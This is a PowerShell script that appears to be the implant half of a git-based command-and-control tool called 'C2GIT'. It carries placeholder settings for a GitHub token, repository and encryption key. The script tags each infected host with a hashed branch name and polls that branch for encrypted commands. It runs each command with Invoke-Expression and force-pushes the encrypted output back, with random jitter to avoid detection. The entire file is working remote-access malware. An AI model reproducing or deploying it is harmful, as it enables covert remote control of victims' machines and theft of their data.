param(
    [switch]$Verbose
)

# Load environment variables if .env exists
if (Test-Path ".env") {
    Get-Content ".env" | ForEach-Object {
        if ($_ -match '^([^=]+)=(.*)$') {
            [Environment]::SetEnvironmentVariable($matches[1], $matches[2])
        }
    }
}

# Configuration with environment variables or defaults
$KEY = $env:SLAVE_KEY ?? "C2GIT_SLAVE_KEY_REPLACEMENT"
$GITHUB_TOKEN = $env:GITHUB_TOKEN ?? "C2GIT_GITHUB_TOKEN_REPLACEMENT"
$REPO_USER = $env:REPO_USER ?? "C2GIT_REPO_USER_REPLACEMENT"
$REPO_NAME = $env:REPO_NAME ?? "C2GIT_REPO_NAME_REPLACEMENT"
$REPO_URL = "https://${GITHUB_TOKEN}@github.com/${REPO_USER}/${REPO_NAME}.git"
$CHECK_INTERVAL = [int]($env:CHECK_INTERVAL ?? "C2GIT_HEARTBEAT_INTERVAL_REPLACEMENT")
$JITTER = [int]($env:JITTER ?? "C2GIT_JITTER_REPLACEMENT")
$REPO_PATH = $env:REPO_PATH ?? "C2GIT_SLAVE_REPO_PATH_REPLACEMENT"

# Generate branch name from hostname
$BRANCH_NAME = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))) -Algorithm MD5).Hash.Substring(0,10).ToLower()

# Logging function
function Write-Log {
    param([string]$Message)
    if ($Verbose) {
        Write-Host $Message
    }
}

# Git wrapper
function Invoke-Git {
    param([string[]]$Arguments)
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "git"
    $startInfo.Arguments = $Arguments -join " "
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    $process.Start() | Out-Null
    $stdout = $process.StandardOutput.ReadToEnd()
    $stderr = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    
    if ($Verbose) {
        if ($stdout) { Write-Host $stdout }
        if ($stderr) { Write-Host $stderr }
    }
    
    return $process.ExitCode -eq 0
}

# Encryption/decryption functions
function Encrypt-Text {
    param([string]$Text)
    try {
        $result = & openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -A -pass "pass:$KEY" 2>$null
        $enc = $Text | & openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -A -pass "pass:$KEY" 2>$null
        if ($LASTEXITCODE -eq 0) {
            return $enc
        }
        Write-Log "OpenSSL encryption failed with exit code $LASTEXITCODE"
        return $null
    }
    catch {
        Write-Log "Encryption failed: $_"
        return $null
    }
}

function Decrypt-Text {
    param([string]$EncryptedText)
    try {
        $dec = $EncryptedText | & openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -d -A -pass "pass:$KEY" 2>$null
        if ($LASTEXITCODE -eq 0) {
            return $dec
        }
        Write-Log "OpenSSL decryption failed with exit code $LASTEXITCODE"
        return $null
    }
    catch {
        Write-Log "Decryption failed: $_"
        return $null
    }
}

# Execute command and capture output
function Execute-Command {
    param([string]$EncryptedCmd)
    
    $cmd = Decrypt-Text $EncryptedCmd
    if (-not $cmd) {
        Write-Log "Failed to decrypt command"
        return $null
    }
    
    Write-Log "Executing command: $cmd"
    
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($output)) {
            $output = "Command executed successfully with no output"
        }
        return Encrypt-Text $output
    }
    catch {
        $errorMsg = "Command failed: $_"
        return Encrypt-Text $errorMsg
    }
}

# Initialize repository
function Initialize-Repository {
    New-Item -ItemType Directory -Force -Path $REPO_PATH | Out-Null
    Set-Location $REPO_PATH
    
    if (-not (Test-Path ".git")) {
        Invoke-Git @("clone", $REPO_URL, ".")
        Invoke-Git @("config", "user.email", "C2GIT_GIT_USER_EMAIL_REPLACEMENT")
        Invoke-Git @("config", "user.name", "C2GIT_GIT_USER_NAME_REPLACEMENT")
    }
    
    # Setup branch
    Invoke-Git @("fetch", "origin")
    if (-not (Invoke-Git @("checkout", $BRANCH_NAME))) {
        Invoke-Git @("checkout", "-b", $BRANCH_NAME)
        # Create encrypted host file
        $encryptedHost = Encrypt-Text $env:COMPUTERNAME
        Set-Content -Path "host" -Value $encryptedHost
        Set-Content -Path "state" -Value "2"
        Invoke-Git @("add", "host", "state")
        Invoke-Git @("commit", "-m", "Initialize branch $BRANCH_NAME with hostname")
        Invoke-Git @("push", "-u", "origin", $BRANCH_NAME)
    }
}

# Update heartbeat
function Update-Heartbeat {
    if (-not (Invoke-Git @("fetch", "origin", $BRANCH_NAME))) {
        Write-Log "Failed to fetch during heartbeat update"
        return $false
    }
    
    if (-not (Invoke-Git @("reset", "--hard", "origin/$BRANCH_NAME"))) {
        Write-Log "Failed to reset during heartbeat update"
        return $false
    }
    
    Set-Content -Path "README.md" -Value (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    Invoke-Git @("add", "README.md")
    Invoke-Git @("commit", "-m", "Heartbeat")
    Invoke-Git @("push", "origin", $BRANCH_NAME)
    return $true
}

# Main loop
function Start-MainLoop {
    Initialize-Repository
    $lastCommand = ""
    
    while ($true) {
        # Sync with remote
        if (-not (Invoke-Git @("fetch", "origin", $BRANCH_NAME))) {
            Write-Log "Failed to fetch from remote"
            Start-Sleep -Seconds 5
            continue
        }
        
        if (-not (Invoke-Git @("reset", "--hard", "origin/$BRANCH_NAME"))) {
            Write-Log "Failed to reset to remote state"
            Start-Sleep -Seconds 5
            continue
        }
        
        # Update heartbeat
        Update-Heartbeat
        
        # Check for new command
        if (-not (Test-Path "state") -or -not (Test-Path "command.txt")) {
            Start-Sleep -Seconds $CHECK_INTERVAL
            continue
        }
        
        $state = Get-Content "state"
        $currentCommand = Get-Content "command.txt"
        
        # Validate state
        if ($state -notmatch "^[0-2]$") {
            Write-Log "Invalid state: $state"
            Start-Sleep -Seconds $CHECK_INTERVAL
            continue
        }
        
        switch ($state) {
            "0" {  # Command sent, waiting for execution
                if ($currentCommand -and ($currentCommand -ne $lastCommand)) {
                    Write-Log "Executing command: $currentCommand"
                    $output = Execute-Command $currentCommand
                    Set-Content -Path "response.txt" -Value $output
                    Set-Content -Path "state" -Value "1"  # Change state to "response ready"
                    $lastCommand = $currentCommand
                    # Commit and push
                    Invoke-Git @("add", "response.txt", "state")
                    Invoke-Git @("commit", "-m", "Command response")
                    Invoke-Git @("push", "-f", "origin", $BRANCH_NAME)
                }
            }
            "1" {  # Response ready, waiting for master to read
                # Check if master has read the response
                Invoke-Git @("fetch", "origin", $BRANCH_NAME)
                $remoteState = git show "origin/$BRANCH_NAME:state"
                if ($remoteState -eq "2") {
                    # Sync with master's state
                    Invoke-Git @("reset", "--hard", "origin/$BRANCH_NAME")
                }
            }
            "2" {  # Ready for new command
                # Just wait for state to change to 0
            }
        }
        
        # Add jitter to avoid synchronization
        $jitter = Get-Random -Minimum 0 -Maximum $env:JITTER
        Start-Sleep -Seconds ($CHECK_INTERVAL + $jitter)
    }
}

# Start the main loop
Start-MainLoop
